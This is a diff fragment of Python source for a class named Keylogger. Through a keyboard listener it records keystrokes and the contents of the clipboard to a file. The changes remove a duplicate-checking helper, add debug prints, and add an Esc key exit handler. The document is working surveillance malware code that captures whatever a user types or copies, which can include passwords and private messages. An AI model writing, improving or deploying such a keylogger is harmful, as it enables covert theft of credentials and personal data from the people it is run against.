@@ -62,18 +62,12 @@ class Keylogger:
 
     def keylogging(self) -> None:
         def on_key_press(key) -> None:
-
-            def is_duplicate(data: str) -> bool:
-                if data and data != self.duplicate[0]:
-                    self.duplicate[0] = data
-                    return False
-                return True
-
             try:
                 # Get the clipboard data
                 data = paste()
 
-                if data and not is_duplicate(data):
+                if data and data != self.duplicate[0]:
+                    self.duplicate[0] = data
                     self.savefile(f'clipboard data: {data}\n')
 
                 # Log the Keystrokes
@@ -81,14 +75,20 @@ class Keylogger:
                 print(f"Key pressed: {key}")  # Debug: Print the key pressed
 
             except Exception as e:
-                alarm(f'Error: {e}')
+                print(f"Key press error: {e}")  # Debug: Print key press errors
+
+        def on_key_release(key):
+            # Stop the listener if a specific key is pressed (e.g., Esc)
+            if key == keyboard.Key.esc:
+                print("Exiting keylogger...")  # Debug: Print exit message
+                return False
 
         try:
-            # Create listener objects
-            with keyboard.Listener(on_press=on_key_press) as listener:
+            print("Starting keyboard listener...")  # Debug: Print listener start
+            with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
                 listener.join()
         except Exception as e:
-            alarm(f"Listener Error: {e}")
+            print(f"Listener error: {e}")  # Debug: Print listener errors
 
     def __del__(self) -> None:
         pass
@@ -244,7 +244,7 @@ if __name__ == '__main__':
             while True:
                 sleep(1)
         except KeyboardInterrupt:
-            pass
+            print("Exiting script...")  # Debug: Print exit message
 
     except Exception as e:
         alarm(f'Main Error: {e}')
